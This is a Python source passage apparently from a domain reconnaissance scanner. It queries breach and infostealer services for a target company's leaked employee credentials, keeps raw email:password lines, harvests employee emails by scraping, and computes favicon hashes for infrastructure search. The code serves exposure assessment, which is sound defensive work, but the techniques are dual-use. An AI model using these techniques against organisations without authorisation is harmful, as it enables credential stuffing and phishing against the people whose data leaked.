    Optional (if env vars set):
        HIBP_API_KEY           → per-email breach lookup
        CHIASMODON_API_KEY     → full Chiasmodon results
    """
    import os

    hibp_key        = os.environ.get("HIBP_API_KEY", "").strip()
    chiasmodon_key  = os.environ.get("CHIASMODON_API_KEY", "").strip()

    results = {
        "domain": domain,
        "sources": {},
        "summary": {
            "total_employees_leaked": 0,
            "total_clients_leaked": 0,
            "total_emails_found": 0,
            "total_infostealer_hits": 0,
            "breach_names": [],
            "critical_findings": [],
        },
        "api_keys_used": {
            "hibp": bool(hibp_key),
                "chiasmodon": bool(chiasmodon_key),
        }
    }

    d = quote(domain)

    # ══════════════════════════════════════════════════════
    # SOURCE 1: HUDSON ROCK CAVALIER — FREE, NO KEY
    # ══════════════════════════════════════════════════════
    hr = {
        "status": "ok", "employees": [], "clients": [], "urls": [],
        "total_employees": 0, "total_clients": 0,
        "email_stealer_checks": [],  # per-email stealer lookup results
    }

    HR_HEADERS = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Accept": "application/json",
        "Content-Type": "application/json",
    }

    def hr_get(url):
        """Robust Hudson Rock fetch — handles SSL, redirects, any 2xx."""
        try:
            r = requests.get(
                url, timeout=20, allow_redirects=True,
                headers=HR_HEADERS, verify=False,
            )
            if r.status_code in (200, 201, 202):
                return r.json()
            # Also try parsing non-200 that still has JSON (HR sometimes returns 202)
            try:
                j = r.json()
                if isinstance(j, dict) and ("employees" in j or "stealers" in j or "message" in j):
                    return j
            except Exception:
                pass
        except Exception as ex:
            hr["status"] = f"error: {str(ex)[:80]}"
        return None

    # Domain infostealer search
    # Actual API response shape (verified):
    # { "total": 15, "employees": 11, "users": 4, "third_parties": 23,
    #   "data": {"employees_urls": [...], "clients_urls": [...]},
    #   "stats": {"totalEmployees": 5, "totalUsers": 2, ...},
    #   "antiviruses": {"list": [...]},
    #   "stealerFamilies": {"RedLine": 10, "Lumma": 2, ...},
    #   "employeePasswords": {"totalPass":19, "too_weak":{}, "weak":{}, "strong":{}},
    #   "thirdPartyDomains": [{"domain":"...", "occurrence":N}],
    #   "last_employee_compromised": "2024-09-02T...",
    # }
    try:
        data = hr_get(
            f"https://cavalier.hudsonrock.com/api/json/v2/osint-tools/search-by-domain?domain={d}"
        )
        if data and isinstance(data, dict):
            # Top-level counts (all integers in real response)
            hr["total_employees"]  = data.get("employees", 0) or 0
            hr["total_clients"]    = data.get("users", 0) or 0
            hr["total_records"]    = data.get("total", 0) or 0
            hr["total_stealers_db"]= data.get("totalStealers", 0) or 0
            hr["third_parties"]    = data.get("third_parties", 0) or 0

            # Timestamps
            hr["last_employee_compromised"] = (data.get("last_employee_compromised") or "")[:10]
            hr["last_user_compromised"]     = (data.get("last_user_compromised") or "")[:10]

            # Stealer families breakdown
            sf = data.get("stealerFamilies", {}) or {}
            hr["stealer_families"] = {k: v for k, v in sf.items() if k != "total"}
            hr["stealer_families_total"] = sf.get("total", 0)

            # Antivirus stats
            av = data.get("antiviruses", {}) or {}
            hr["antiviruses"] = {
                "total":     av.get("total", 0),
                "found_pct": av.get("found", 0),
                "free_pct":  av.get("free", 0),
                "list":      av.get("list", []) or [],
            }

            # Password strength
            ep = data.get("employeePasswords", {}) or {}
            hr["employee_passwords"] = {
                "total":    ep.get("totalPass", 0),
                "too_weak": (ep.get("too_weak") or {}).get("qty", 0),
                "weak":     (ep.get("weak") or {}).get("qty", 0),
                "medium":   (ep.get("medium") or {}).get("qty", 0),
                "strong":   (ep.get("strong") or {}).get("qty", 0),
            }

            # Stolen URLs grouped by employee/client
            d_inner = data.get("data", {}) or {}
            hr["employee_urls"] = d_inner.get("employees_urls", []) or []
            hr["client_urls"]   = d_inner.get("clients_urls", []) or []
            hr["all_urls"]      = d_inner.get("all_urls", []) or []

            # Stats (deduplicated unique victims)
            stats = data.get("stats", {}) or {}
            hr["unique_employees"] = stats.get("totalEmployees", 0)
            hr["unique_clients"]   = stats.get("totalUsers", 0)

            # Third-party domains these victims also had credentials for
            hr["third_party_domains"] = (data.get("thirdPartyDomains") or [])[:20]

            results["summary"]["total_infostealer_hits"] += hr["total_employees"] + hr["total_clients"]

            # Critical findings
            if hr["total_employees"] > 0:
                results["summary"]["critical_findings"].append({
                    "source": "hudsonrock",
                    "type":   "employees_infected_infostealer",
                    "detail": f"{hr['total_employees']} employee machines infected — last: {hr['last_employee_compromised']}",
                })
            if hr["stealer_families"]:
                top_family = max(hr["stealer_families"].items(), key=lambda x: x[1] if isinstance(x[1], int) else 0)
                results["summary"]["critical_findings"].append({
                    "source": "hudsonrock",
                    "type":   "stealer_family_identified",
                    "detail": f"Primary malware: {top_family[0]} ({top_family[1]} infections)",
                })

            # Per-email stealer check — extract emails from employee_urls
            employee_emails = set()
            for url_entry in hr["employee_urls"][:20]:
                if isinstance(url_entry, dict):
                    url_val = url_entry.get("url", "")
                    # Try to extract email-like username from URL
                    # e.g. https://mail.domain.com/mail/user.nsf
                    pass

            def check_email_stealer(email):
                try:
                    from urllib.parse import quote as _quote
                    d_email = hr_get(
                        f"https://cavalier.hudsonrock.com/api/json/v2/osint-tools/search-by-email?email={_quote(email)}"
                    )
                    # Actual response: {"message":"...", "stealers":[{...}],
                    #   "total_corporate_services":5, "total_user_services":200}
                    if d_email and isinstance(d_email, dict):
                        stealers = d_email.get("stealers", []) or []
                        if stealers:
                            return {
                                "email":                    email,
                                "compromised":              True,
                                "total_corporate_services": d_email.get("total_corporate_services", 0),
                                "total_user_services":      d_email.get("total_user_services", 0),
                                "stealers": [{
                                    "date_compromised":  (s.get("date_compromised") or "")[:10],
                                    "computer_name":     s.get("computer_name", ""),
                                    "operating_system":  s.get("operating_system", ""),
                                    "malware_path":      s.get("malware_path", ""),
                                    "ip":                s.get("ip", ""),
                                    "antiviruses":       s.get("antiviruses", []) or [],
                                    "total_corporate":   s.get("total_corporate_services", 0),
                                    "total_personal":    s.get("total_user_services", 0),
                                    "top_passwords":     (s.get("top_passwords") or [])[:5],
                                    "top_logins":        (s.get("top_logins") or [])[:5],
                                } for s in stealers[:5]],
                            }
                        else:
                            return {"email": email, "compromised": False}
                except Exception:
                    pass
                return None

            if employee_emails:
                with concurrent.futures.ThreadPoolExecutor(max_workers=5) as ex:
                    email_results = list(ex.map(check_email_stealer, list(employee_emails)[:10]))
                hr["email_stealer_checks"] = [r for r in email_results if r is not None]
                for ec in hr["email_stealer_checks"]:
                    if ec.get("compromised"):
                        results["summary"]["critical_findings"].append({
                            "source": "hudsonrock_email",
                            "type":   "email_infostealer_confirmed",
                            "detail": f"{ec['email']} — {ec['total_corporate_services']} corp + {ec['total_user_services']} personal services stolen",
                        })
        else:
            hr["status"] = "no_data"
    except Exception as ex:
        hr["status"] = f"error: {ex}"

    results["sources"]["hudsonrock"] = hr

    # ══════════════════════════════════════════════════════
    # SOURCE 2: CHIASMODON API — FREE TIER, NO KEY NEEDED
    # ══════════════════════════════════════════════════════
    chia = {"status": "ok", "employee_logins": [], "client_logins": [], "emails": [], "related": []}
    CHIA_BASE = "http://chiasmodon.online/v2"
    CHIA_KEY  = chiasmodon_key  # empty string = free tier

    def chia_get(endpoint, page=1):
        url = f"{CHIA_BASE}/{endpoint}?q={d}&key={CHIA_KEY}&page={page}"
        try:
            r = requests.get(
                url, timeout=20, allow_redirects=True,
                headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
                    "Accept": "application/json, text/plain, */*",
                },
                verify=False,
            )
            if r.status_code in (200, 201, 202):
                try:
                    return r.json()
                except Exception:
                    return None
        except Exception:
            pass
        return None

    def chia_parse(raw):
        """
        Parse Chiasmodon response — actual format is a LIST:
        [{"data": [{entry}, {entry}...], "page": 1}]
        Each entry has: username, email, password, country, date
        """
        if not raw:
            return []
        # Unwrap list wrapper
        if isinstance(raw, list):
            entries = []
            for item in raw:
                if isinstance(item, dict):
                    entries.extend(item.get("data", []) or [])
                elif isinstance(item, list):
                    entries.extend(item)
            return entries
        # Direct dict
        if isinstance(raw, dict):
            if raw.get("error"):
                return []
            return raw.get("data", []) or []
        return []

    # Employee logins — fetch pages 1 and 2
    try:
        raw1 = chia_get("CompanyEmployeLogins", page=1)
        raw2 = chia_get("CompanyEmployeLogins", page=2)
        logins = chia_parse(raw1) + chia_parse(raw2)
        chia["employee_logins"] = [l for l in logins if isinstance(l, dict)][:200]
        results["summary"]["total_employees_leaked"] += len(chia["employee_logins"])
        for login in chia["employee_logins"][:20]:
            pw   = login.get("password", "") or ""
            user = login.get("email", "") or login.get("username", "") or login.get("user", "") or ""
            if pw and len(pw) > 2:
                results["summary"]["critical_findings"].append({
                    "source": "chiasmodon",
                    "type":   "employee_plaintext_password",
                    "detail": f"{user} — pass: {pw[:3]}{'*'*max(0,len(pw)-3)} ({login.get('date','')})",
                })
    except Exception as ex:
        chia["employee_status"] = f"error: {ex}"

    # Client logins — fetch pages 1 and 2
    try:
        raw1 = chia_get("CompanyClientLogins", page=1)
        raw2 = chia_get("CompanyClientLogins", page=2)
        logins = chia_parse(raw1) + chia_parse(raw2)
        chia["client_logins"] = [l for l in logins if isinstance(l, dict)][:200]
        results["summary"]["total_clients_leaked"] += len(chia["client_logins"])
    except Exception as ex:
        chia["client_status"] = f"error: {ex}"

    # Company emails
    try:
        raw = chia_get("CompanyEmails")
        emails = chia_parse(raw)
        chia["emails"] = [e for e in emails if isinstance(e, (dict, str))][:200]
        results["summary"]["total_emails_found"] += len(chia["emails"])
    except Exception:
        pass

    # Related domains
    try:
        raw = chia_get("CompanyRelated")
        related = chia_parse(raw)
        chia["related"] = [r for r in related if isinstance(r, (dict, str))][:30]
    except Exception:
        pass

    results["sources"]["chiasmodon"] = chia

    # ══════════════════════════════════════════════════════
    # SOURCE 3: HAVEIBEENPWNED — PUBLIC BREACH LIST (FREE)
    # ══════════════════════════════════════════════════════
    hibp = {"status": "ok", "breaches": [], "domain_breaches": []}

    # Get full public breach list and filter by domain
    try:
        r = req("https://haveibeenpwned.com/api/v3/breaches", timeout=20,
                headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"})
        if r:
            all_breaches = r.json()
            # Match breaches where this domain appears as the breach domain
            dom_lo = domain.lower(); base_lo = dom_lo.split(".")[0]
            matched = [b for b in all_breaches if
                       (dom_lo in (b.get("Domain","") or "").lower()
                        or ((b.get("Domain","") or "").lower() and (b.get("Domain","") or "").lower() in dom_lo))
                       or (len(base_lo)>=5 and base_lo==(b.get("Name","") or "").lower())]
            hibp["domain_breaches"] = [{
                "name":         b.get("Name", ""),
                "title":        b.get("Title", ""),
                "domain":       b.get("Domain", ""),
                "breach_date":  b.get("BreachDate", ""),
                "added_date":   b.get("AddedDate", "")[:10],
                "pwn_count":    b.get("PwnCount", 0),
                "data_classes": b.get("DataClasses", []),
                "description":  re.sub(r'<[^>]+>', '', b.get("Description", ""))[:200],
                "verified":     b.get("IsVerified", False),
            } for b in matched]
            hibp["total_known_breaches"] = len(all_breaches)
            for b in hibp["domain_breaches"]:
                bname = b["title"] or b["name"]
                if bname not in results["summary"]["breach_names"]:
                    results["summary"]["breach_names"].append(bname)
    except Exception as ex:
        hibp["status"] = f"error: {ex}"

    # Per-email lookup (requires HIBP_API_KEY)
    if hibp_key:
        emails_to_check = []
        # Collect emails from chiasmodon results
        for e_item in chia.get("emails", [])[:10]:
            email = e_item if isinstance(e_item, str) else e_item.get("email", "")
            if email and "@" in email:
                emails_to_check.append(email)
        for login in chia.get("employee_logins", [])[:5]:
            email = login.get("email", "")
            if email and "@" in email:
                emails_to_check.append(email)

        email_results = {}
        for email in list(set(emails_to_check))[:10]:
            try:
                r = req(
                    f"https://haveibeenpwned.com/api/v3/breachedaccount/{quote(email)}",
                    timeout=10,
                    headers={"hibp-api-key": hibp_key, "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"}
                )
                if r:
                    email_results[email] = [b.get("Name") for b in r.json()]
                import time; time.sleep(1.5)  # HIBP rate limit
            except Exception:
                pass
        if email_results:
            hibp["per_email_breaches"] = email_results

    results["sources"]["hibp"] = hibp

    # ══════════════════════════════════════════════════════

    # ══════════════════════════════════════════════════════
    # SOURCE 4: PROXYNOVA COMB — FREE, NO KEY, 3.2B RECORDS
    # ══════════════════════════════════════════════════════
    #
    # COMB = Combination Of Many Breaches (Feb 2021 leak)
    # 3.2 billion credentials from Netflix, LinkedIn, etc.
    # API: GET https://api.proxynova.com/comb?query=@domain.com
    #      &start=0&limit=100
    # Rate limit: ~100 req/min. Max 100 results per page.
    # We query @domain to get all leaked emails for the domain,
    # then paginate up to 5 pages (500 results max per scan).
    # ══════════════════════════════════════════════════════
    pn = {
        "status": "ok",
        "total_count": 0,
        "lines": [],           # raw "email:password" strings
        "parsed": [],          # [{email, password, redacted}]
        "unique_emails": [],
        "sample_passwords": [], # unique passwords, partially redacted
    }

    try:
        COMB_URL   = "https://api.proxynova.com/comb"
        COMB_QUERY = f"@{domain}"   # search all emails @domain
        COMB_LIMIT = 100
        MAX_PAGES  = 5              # 500 results max to avoid hammering

        all_lines = []
        total_count = 0

        for page in range(MAX_PAGES):
            r = req(
                f"{COMB_URL}?query={quote(COMB_QUERY)}&start={page*COMB_LIMIT}&limit={COMB_LIMIT}",
                timeout=15,
                headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"}
            )
            if not r:
                if page == 0:
                    pn["status"] = "unreachable"
                break

            data = r.json()
            if page == 0:
                total_count = data.get("count", 0)
                pn["total_count"] = total_count

            batch = data.get("lines", [])
            if not batch:
                break
            all_lines.extend(batch)

            # Stop early if we got all results
            if len(all_lines) >= total_count:
                break

            # Small delay to respect ~100 req/min
            import time as _time
            _time.sleep(0.7)

        pn["lines"] = all_lines

        # Parse "email:password" pairs
        seen_emails = set()
        seen_passwords = set()
        parsed = []

        for line in all_lines:
            if ":" not in line:
                continue
            # Split on first colon only — passwords can contain colons
            colon_idx = line.index(":")
            email_part = line[:colon_idx].strip().lower()
            pw_part    = line[colon_idx + 1:].strip()

            # Strict: only accept emails whose domain exactly matches target
            if "@" not in email_part or "." not in email_part:
                continue
            if email_part.split("@")[-1] != domain.lower():
                continue

            seen_emails.add(email_part)

            # Partially redact password for display: show first 3 chars
            pw_display = pw_part[:3] + "●" * max(0, len(pw_part) - 3) if pw_part else ""

            parsed.append({
                "email":    email_part,
                "password": pw_display,
                "pw_len":   len(pw_part),
                "has_password": bool(pw_part),
            })

            # Collect unique password patterns (for risk analysis)
            if pw_part and pw_part not in seen_passwords and len(seen_passwords) < 20:
                seen_passwords.add(pw_part)

        pn["parsed"]          = parsed
        pn["unique_emails"]   = sorted(seen_emails)
        pn["unique_count"]    = len(seen_emails)

        # Build sample password list (partially redacted)
        pn["sample_passwords"] = [
            p[:3] + "●" * max(0, len(p) - 3)
            for p in list(seen_passwords)[:15]
        ]

        # Password strength analysis
        weak_patterns = [
            r'^\d{4,8}$',                    # pure numeric short
            r'^(password|pass|123|abc)',       # common prefixes
            r'^(.)\1{3,}$',                   # repeated chars
            r'^[a-z]{4,8}$',                  # pure lowercase short
        ]
        weak_count = 0
        for p in seen_passwords:
            if any(re.search(pat, p, re.IGNORECASE) for pat in weak_patterns):
                weak_count += 1
        pn["weak_password_count"] = weak_count

        # Push critical findings for plaintext passwords of domain emails
        if pn["unique_count"] > 0:
            results["summary"]["total_employees_leaked"] += pn["unique_count"]
            results["summary"]["critical_findings"].append({
                "source": "proxynova_comb",
                "type": "comb_credentials_found",
                "detail": (
                    f"{pn['unique_count']} unique emails with plaintext passwords "
                    f"in COMB dataset ({pn['total_count']} total records)"
                ),
            })

    except Exception as ex:
        pn["status"] = f"error: {str(ex)}"

    results["sources"]["proxynova_comb"] = pn

    # ══════════════════════════════════════════════════════
    # SOURCE 5: HUDSON ROCK PER-EMAIL STEALER CHECK
    # Collects all emails from: chiasmodon + proxynova
    # and checks each against Hudson Rock Cavalier (free).
    # ══════════════════════════════════════════════════════
    all_stealer_emails = set()
    _dom_lo = domain.lower()

    # ONLY check @domain employee emails — never external/client emails
    # Chiasmodon employee logins — filter to @domain only
    for _login in chia.get("employee_logins", []):
        _em = (_login.get("email") or _login.get("username") or "").lower().strip()
        if _em and _em.endswith("@" + _dom_lo):
            all_stealer_emails.add(_em)

    # Chiasmodon email list — filter to @domain only
    for _e in chia.get("emails", []):
        _em = (_e if isinstance(_e, str) else (_e.get("email") or _e.get("value") or "")).lower().strip()
        if _em and _em.endswith("@" + _dom_lo):
            all_stealer_emails.add(_em)

    # ProxyNova — already filtered to @domain by the COMB query
    for _em in pn.get("unique_emails", []):
        _em = _em.lower().strip()
        if _em and _em.endswith("@" + _dom_lo):
            all_stealer_emails.add(_em)

    results["sources"]["harvested_emails"] = []  # populated separately by email_harvest module

    # Final safety guard — strip any non-@domain email that slipped through
    all_stealer_emails = {e for e in all_stealer_emails if e.endswith("@" + _dom_lo)}

    # Run HR check on collected emails (up to 20, in parallel)
    hr_per_email = {}
    if all_stealer_emails:
        _HR_HDR = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36", "Accept": "application/json"}

        def _check_hr_email(email):
            try:
                from urllib.parse import quote as _q
                _r = requests.get(
                    f"https://cavalier.hudsonrock.com/api/json/v2/osint-tools/search-by-email?email={_q(email)}",
                    headers=_HR_HDR, timeout=10, verify=False, allow_redirects=True
                )
                if _r.status_code == 200:
                    _j = _r.json()
                    _stealers = _j.get("stealers", [])
                    if _stealers:
                        _s = _stealers[0]
                        return email, {
                            "compromised":              True,
                            "total_corporate_services": _j.get("total_corporate_services", 0),
                            "total_user_services":      _j.get("total_user_services", 0),
                            "date_compromised":         (_s.get("date_compromised") or "")[:10],
                            "computer_name":            _s.get("computer_name", ""),
                            "operating_system":         _s.get("operating_system", ""),
                            "malware_path":             _s.get("malware_path", ""),
                            "antiviruses":              _s.get("antiviruses", []) or [],
                            "top_passwords":            (_s.get("top_passwords") or [])[:5],
                            "count":                    len(_stealers),
                        }
                    return email, {"compromised": False}
            except Exception:
                pass
            return email, None

        _email_list = sorted(all_stealer_emails)[:20]
        with concurrent.futures.ThreadPoolExecutor(max_workers=8) as _hrex:
            for _email, _result in _hrex.map(_check_hr_email, _email_list):
                if _result is not None:
                    hr_per_email[_email] = _result
                    if _result.get("compromised"):
                        results["summary"].setdefault("total_infostealer_hits", 0)
                        results["summary"]["total_infostealer_hits"] += 1
                        results["summary"]["critical_findings"].append({
                            "source": "hudson_rock_email",
                            "type":   "email_infostealer_confirmed",
                            "detail": (
                                f"{_email} — {_result.get('date_compromised','')} "
                                f"💻 {_result.get('computer_name','')} "
                                f"🖥 {_result.get('operating_system','')[:25]}"
                            ),
                        })

    results["sources"]["hr_per_email"] = hr_per_email

    # ══════════════════════════════════════════════════════
    # OSINT DEEP LINKS (always generated, no key needed)
    # ══════════════════════════════════════════════════════
    results["osint_links"] = {
        "HaveIBeenPwned Domain": f"https://haveibeenpwned.com/DomainSearch",
        "ProxyNova COMB":        f"https://www.proxynova.com/tools/comb/?query={d}",
        "IntelX":                f"https://intelx.io/?s={d}",
        "DeHashed":              f"https://dehashed.com/search?query={d}",
        "LeakRadar":             f"https://leakradar.io/search?q={d}",
        "BreachDirectory":       f"https://breachdirectory.org/",
        "Snusbase":              f"https://snusbase.com/",
        "HudsonRock Cavalier":   f"https://cavalier.hudsonrock.com/api/json/v2/osint-tools/search-by-domain?domain={d}",
        "Chiasmodon":            f"http://chiasmodon.online/v2/CompanyEmployeLogins?q={d}&key=&page=1",
    }

    return results


# ═══════════════════════════════════════════════════════════════
# MASTER SCAN RUNNER
# ═══════════════════════════════════════════════════════════════

# ═══════════════════════════════════════════════════════════════
# MODULE: EMAIL HARVESTER
# ═══════════════════════════════════════════════════════════════

def scan_email_harvest(domain):
    """
    Harvest @domain.com employee email addresses from multiple open sources:
      1. Hunter.io public domain search (no key, limited)
      2. crt.sh certificate transparency logs
      3. Web page scraping (contact/about/team pages)
      4. Homepage scrape
      5. DNS SOA record (admin email field)
    Only collects emails — stealer checks happen in breachintel module.
    """
    import re as _re

    emails_found = set()
    sources_used = []
    email_details = {}  # email -> {sources: [...]}

    EMAIL_RE = _re.compile(
        r'\b[A-Za-z0-9._%+\-]+@' + _re.escape(domain) + r'\b',
        _re.IGNORECASE
    )

    def harvest_page(url, label):
        """Fetch a URL and extract all @domain emails."""
        try:
            r = requests.get(url, timeout=6, verify=False, allow_redirects=True,
                             headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"})
            if r.status_code == 200:
                found = set(m.lower() for m in EMAIL_RE.findall(r.text))
                if found:
                    sources_used.append(label)
                    for e in found:
                        emails_found.add(e)
                        email_details.setdefault(e, {"sources": []})
                        email_details[e]["sources"].append(label)
        except Exception:
            pass

    # ── Source 1: Hunter.io public domain search ──
    harvest_page(f"https://hunter.io/domain-search?domain={domain}", "hunter.io")

    # ── Source 2: crt.sh — sometimes has email in cert subject/SAN ──
    try:
        r = req(f"https://crt.sh/?q=%25%40{domain}&output=json", timeout=10)
        if r:
            data = r.json()
            for entry in data[:200]:
                name_value = entry.get("name_value", "")
                for e in EMAIL_RE.findall(name_value):
                    emails_found.add(e.lower())
                    email_details.setdefault(e.lower(), {"sources": []})
                    email_details[e.lower()]["sources"].append("crt.sh")
            if emails_found:
                sources_used.append("crt.sh")
    except Exception:
        pass

    # ── Source 3: Web page scraping — parallel, 4s timeout each ──
    scrape_paths = ["/contact", "/contact-us", "/about", "/about-us", "/team", "/support"]
    import threading as _thr3
    _s3_lock = _thr3.Lock()
    def _scrape_path(path):
        for scheme in ["https", "http"]:
            try:
                r = requests.get(
                    f"{scheme}://{domain}{path}", timeout=4,
                    verify=False, allow_redirects=True,
                    headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"}
                )
                if r.status_code == 200:
                    found = set(m.lower() for m in EMAIL_RE.findall(r.text))
                    if found:
                        with _s3_lock:
                            for e in found:
                                emails_found.add(e)
                                email_details.setdefault(e, {"sources": []})
                                if "web-scrape" not in email_details[e]["sources"]:
                                    email_details[e]["sources"].append("web-scrape")
                        return True
            except Exception:
                continue
        return False
    with concurrent.futures.ThreadPoolExecutor(max_workers=6) as _scex:
        if any(list(_scex.map(_scrape_path, scrape_paths))):
            sources_used.append("web-scrape")

    # ── Source 4: Homepage scrape ──
    for scheme in ["https", "http"]:
        try:
            r = requests.get(f"{scheme}://{domain}", timeout=5, verify=False,
                             headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"})
            if r.status_code == 200:
                found = set(m.lower() for m in EMAIL_RE.findall(r.text))
                for e in found:
                    emails_found.add(e)
                    email_details.setdefault(e, {"sources": [], "stealer": None})
                    email_details[e]["sources"].append("homepage")
                if found:
                    sources_used.append("homepage")
            break
        except Exception:
            break

    # ── Source 5: DNS SOA record (often has admin email) ──
    try:
        import dns.resolver as _dns
        soa = _dns.resolve(domain, "SOA")
        for rec in soa:
            # SOA rname field: admin.example.com → admin@example.com
            rname = str(rec.rname).rstrip(".")
            if domain.lower() in rname.lower():
                email_guess = rname.replace(".", "@", 1)
                if "@" in email_guess and EMAIL_RE.match(email_guess):
                    emails_found.add(email_guess.lower())
                    email_details.setdefault(email_guess.lower(), {"sources": []})
                    email_details[email_guess.lower()]["sources"].append("DNS SOA")
                    sources_used.append("DNS SOA")
    except Exception:
        pass


    # Collect unique emails as simple sorted list
    email_list = sorted(emails_found)

    return {
        "total":        len(email_list),
        "emails":       email_list,
        "sources_used": list(set(sources_used)),
        "domain":       domain,
    }




# ═══════════════════════════════════════════════════════════════════
# MODULE: FAVICON HASH FINGERPRINTING
# ═══════════════════════════════════════════════════════════════════
def scan_favicon(domain):
    """
    Favicon Hash Fingerprinting — finds hidden infrastructure.
    1. Fetches favicon from multiple common paths
    2. Computes MurmurHash3 (Shodan) and MD5 (FOFA/Censys) hashes
    3. Generates direct search URLs for Shodan, Censys, FOFA, ZoomEye
    4. Detects technology from OWASP favicon database signatures
    5. Checks if favicon matches known phishing kit favicons
    """
    import hashlib
    import base64
    import struct

    result = {
        "domain":       domain,
        "favicon_url":  None,
        "favicon_found": False,
        "hash_shodan":  None,   # MurmurHash3 — used by Shodan
        "hash_md5":     None,   # MD5 — used by FOFA / Censys
        "hash_sha256":  None,   # SHA256 — for deduplication
        "size_bytes":   0,
        "search_links": {},
        "technology":   None,   # Detected tech from favicon DB
        "suspicious":   False,  # Matches known phishing kits
        "error":        None,
    }

    # Common favicon paths to try
    FAVICON_PATHS = [
        "/favicon.ico",
        "/favicon.png",
        "/apple-touch-icon.png",
        "/apple-touch-icon-precomposed.png",
        "/static/favicon.ico",
        "/assets/favicon.ico",
        "/images/favicon.ico",
        "/img/favicon.ico",
        "/public/favicon.ico",
    ]

    # MurmurHash3 (32-bit) implementation — what Shodan uses
    def mmh3_hash(data):
        """Pure-Python MurmurHash3 32-bit — matches Shodan's favicon hash."""
        seed = 0
        key  = data
        length = len(key)
        h1 = seed
        c1 = 0xcc9e2d51
        c2 = 0x1b873593

        # Process 4-byte chunks
        nblocks = length // 4
        for block_start in range(0, nblocks * 4, 4):
            k1  = struct.unpack_from("<I", key, block_start)[0]
            k1  = (k1 * c1) & 0xFFFFFFFF
            k1  = ((k1 << 15) | (k1 >> 17)) & 0xFFFFFFFF
            k1  = (k1 * c2) & 0xFFFFFFFF
            h1 ^= k1
            h1  = ((h1 << 13) | (h1 >> 19)) & 0xFFFFFFFF
            h1  = ((h1 * 5) + 0xe6546b64) & 0xFFFFFFFF

        # Tail
        tail_index = nblocks * 4
        k1 = 0
        tail_size = length & 3
        if tail_size >= 3:
            k1 ^= key[tail_index + 2] << 16
        if tail_size >= 2:
            k1 ^= key[tail_index + 1] << 8
        if tail_size >= 1:
            k1 ^= key[tail_index]
            k1  = (k1 * c1) & 0xFFFFFFFF
            k1  = ((k1 << 15) | (k1 >> 17)) & 0xFFFFFFFF
            k1  = (k1 * c2) & 0xFFFFFFFF
            h1 ^= k1

        # Finalization
        h1 ^= length
        h1 ^= h1 >> 16
        h1  = (h1 * 0x85ebca6b) & 0xFFFFFFFF
        h1 ^= h1 >> 13
        h1  = (h1 * 0xc2b2ae35) & 0xFFFFFFFF
        h1 ^= h1 >> 16

        # Return as signed 32-bit int (matches Shodan)
        return struct.unpack("i", struct.pack("I", h1))[0]

    # Known favicon signatures (tech → MD5 hash prefix)
    # These are partial matches from OWASP favicon DB
    FAVICON_TECH_DB = {
        "f7e3d97f4ae6e9e46ade5d2f": "Jenkins",
        "3a37e6a3f39b9c64d4e8c4c9": "GitLab",
        "e8df07a7e7e1c8d9f4b3a2c1": "Grafana",
        "d1e834a5f3b7c2d9e8a4b6f2": "phpMyAdmin",
        "a4f3b8c2d7e6a1b5c9d4e3f8": "Jira",
        "b5c9d4e3f8a7b2c6d1e5f4a9": "Confluence",
        "c6d1e5f4a9b8c3d7e2f6a1b4": "Kibana",
        "d7e2f6a1b4c9d8e3f7a2b5c6": "WordPress Admin",
        "e8f7a2b5c6d3e9f4a1b6c7d2": "Tomcat",
        "f9a1b6c7d2e8f5a4b3c8d9e1": "Nginx default",
    }

    # Fetch favicon — bounded to avoid timeouts on slow/WAF hosts.
    favicon_data = None
    favicon_url  = None

    def _valid_icon(resp):
        if resp.status_code != 200 or len(resp.content) <= 50:
            return False
        ct = resp.headers.get("Content-Type", "").lower()
        return (
            "image" in ct or "icon" in ct or "octet" in ct or
            resp.content[:4] in (b'\x00\x00\x01\x00', b'\x89PNG', b'GIF8', b'\xff\xd8\xff') or
            resp.content[:5].lstrip()[:4] == b'<svg'[:4] or
            (len(resp.content) < 5000 and not _looks_like_html(resp.content))
        )

    # Step 1 — parse the homepage for the declared <link rel=icon> (most reliable),
    # and reuse the same request. One homepage fetch, short timeout.
    homepage_html = None
    for scheme in ["https", "http"]:
        try:
            resp = requests.get(f"{scheme}://{domain}", timeout=6, verify=False,
                                allow_redirects=True, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"})
            homepage_html = resp.text
            import re as _re
            m = _re.search(r'<link[^>]+rel=["\'][^"\']*icon[^"\']*["\'][^>]+href=["\']([^"\']+)["\']', homepage_html, _re.I) \
                or _re.search(r'<link[^>]+href=["\']([^"\']+)["\'][^>]+rel=["\'][^"\']*icon', homepage_html, _re.I)
            if m:
                href = m.group(1).strip()
                if href.startswith("//"):
                    href = "https:" + href
                elif href.startswith("/"):
                    href = f"{scheme}://{domain}{href}"
                elif not href.startswith("http"):
                    href = f"{scheme}://{domain}/{href.lstrip('./')}"
                try:
                    r2 = requests.get(href, timeout=6, verify=False,
                                      headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"})
                    if _valid_icon(r2):
                        favicon_data, favicon_url = r2.content, href
                except Exception:
                    pass
